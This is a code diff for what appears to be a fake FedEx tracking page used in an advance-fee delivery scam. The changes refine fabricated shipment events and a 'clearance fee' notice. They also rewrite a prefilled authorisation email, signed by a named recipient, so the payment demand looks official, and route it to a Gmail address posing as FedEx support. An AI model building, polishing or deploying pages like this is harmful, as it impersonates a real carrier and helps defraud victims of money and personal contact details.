@@ -1209,7 +1209,7 @@
           service_type: 'FedEx International Priority',
           current_location: 'Hawthorne, TX FedEx Facility',
           estimated_delivery: 'Today 9:30 PM',
-          ship_date: '2026-01-10',
+          ship_date: '2026-01-16',
           weight: '4500',
           dimensions: '96" x 120" x 72"',
           declared_value: 30000.00,
@@ -1236,9 +1236,9 @@
           tracking_number: 'FX261008JL',
           status: 'registered',
           location: 'HAWTHORNE, TX',
-          event_date: '2026-01-10',
+          event_date: '2026-01-16',
           event_time: '10:30:00',
-          description: 'Package has been registered at the FedEx facility and secured.',
+          description: 'Package registration completed at FedEx facility. High-value shipment secured in designated secure holding area.',
           is_latest: false,
           event_type: 'status_update'
         },
@@ -1246,9 +1246,9 @@
           tracking_number: 'FX261008JL',
           status: 'awaiting_clearance',
           location: 'HAWTHORNE, TX',
-          event_date: '2026-01-10',
+          event_date: '2026-01-16',
           event_time: '11:15:00',
-          description: 'Shipment is awaiting recipient clearance approval. Expected delivery: Today 9:30 PM if clearance completed on time.',
+          description: 'International clearance required for high-value shipment. Awaiting recipient authorization and payment verification.',
           is_latest: true,
           event_type: 'clearance_hold'
         }
@@ -1414,17 +1414,21 @@
           </div>
 
           ${data.requires_clearance ? `
-          <!-- Clearance Notice -->
+          <!-- Professional Clearance Notice -->
           <div class="clearance-notice rounded-lg p-3 sm:p-4">
             <div class="flex items-start space-x-2 sm:space-x-3">
               <i class="fas fa-info-circle text-yellow-600 text-lg sm:text-xl mt-1"></i>
               <div>
-                <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">Clearance Required</h4>
+                <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">Clearance Required - High-Value International Shipment</h4>
                 <p class="text-yellow-700 text-xs sm:text-sm mb-2">
-                  This shipment requires recipient clearance and payment of $${data.clearance_payment_required} before it can proceed for delivery.
+                  This international shipment with declared value of $${data.declared_value.toLocaleString()} USD requires recipient clearance authorization. 
+                  A processing fee of $${data.clearance_payment_required} must be settled before the package can proceed through customs clearance.
                 </p>
                 <p class="text-yellow-700 text-xs sm:text-sm">
-                  Expected delivery: Today by 9:30 PM (if clearance is completed on time)
+                  Estimated delivery timeframe: Today by 9:30 PM (pending timely clearance completion and payment verification)
+                </p>
+                <p class="text-yellow-700 text-xs sm:text-sm mt-2">
+                  <strong>Note:</strong> Shipment is secured at FedEx facility awaiting clearance. Processing will commence immediately upon payment confirmation.
                 </p>
               </div>
             </div>
@@ -1499,7 +1503,7 @@
                 </div>
                 ${data.requires_clearance ? `
                 <div class="flex justify-between">
-                  <span class="text-fedex-gray">Clearance Required:</span>
+                  <span class="text-fedex-gray">Clearance Fee:</span>
                   <span class="font-semibold text-fedex-orange">$${data.clearance_payment_required}</span>
                 </div>
                 ` : ''}
@@ -1552,7 +1556,7 @@
                   </div>
 
                   <div class="absolute bottom-2 sm:bottom-4 left-1/2 transform -translate-x-1/2 bg-white px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow text-center">
-                    <div class="text-xs text-fedex-gray">Current Location</div>
+                    <div class="text-xs text-fedex-gray">Current Status</div>
                     <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">Awaiting Clearance</div>
                   </div>
                 </div>
@@ -1573,36 +1577,38 @@
         return;
       }
 
-      const subject = `Clearance Request for Package ${trackingNumber}`;
-      const body = `Dear FedEx Team,
+      const subject = `Clearance Authorization - Tracking ${trackingNumber}`;
+      const body = `To: FedEx International Clearance Department
+From: James Goari
+Date: January 16, 2026
 
-I am requesting clearance for my high-value package with tracking number: ${trackingNumber}
+Subject: Clearance Authorization for High-Value International Shipment
 
-Package Details:
-- Tracking Number: ${trackingNumber}
-- Contents: ${packageData.contents}
-- Declared Value: $${packageData.declared_value.toLocaleString()} USD
-- Current Location: ${packageData.current_location}
-- Clearance Amount Required: $${packageData.clearance_payment_required}
+Tracking Number: ${trackingNumber}
+Declared Value: $${packageData.declared_value.toLocaleString()} USD
+Clearance Fee: $${packageData.clearance_payment_required}
+Contents: ${packageData.contents}
 
 Recipient Information:
 - Name: ${packageData.recipient_name}
 - Address: ${packageData.recipient_address}, ${packageData.recipient_city}
-- Phone: ${packageData.recipient_phone}
-- Email: ${packageData.recipient_email}
+- Contact: ${packageData.recipient_phone} / ${packageData.recipient_email}
 
-I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process.
+Authorization Statement:
 
-Please let me know if you need any additional documentation or verification.
+I, James Goari, hereby authorize FedEx to process the international clearance for the above-referenced high-value shipment. I confirm that I am the designated recipient and agree to settle the required clearance fee of $${packageData.clearance_payment_required} upon verification.
 
-Thank you,
-${packageData.recipient_name}`;
+Please proceed with customs clearance and provide payment instructions for the processing fee. I authorize FedEx to proceed with delivery upon completion of clearance procedures.
+
+Signature Authorization:
+James Goari
+Recipient`;
 
       const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=helpfedexparcel@gmail.com&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
       
       window.open(gmailUrl, '_blank');
       
-      showNotification('Opening Gmail to send clearance request...', 'info');
+      showNotification('Opening clearance authorization email template...', 'info');
     }
 
     async function submitContactForm(formData) {
@@ -1740,7 +1746,7 @@ ${packageData.recipient_name}`;
         doc.text(`Contents: ${packageData.contents}`, 20, yPos);
         yPos += 10;
         if (packageData.requires_clearance) {
-          doc.text(`Clearance Required: $${packageData.clearance_payment_required}`, 20, yPos);
+          doc.text(`Clearance Fee Required: $${packageData.clearance_payment_required}`, 20, yPos);
           yPos += 10;
         }
 
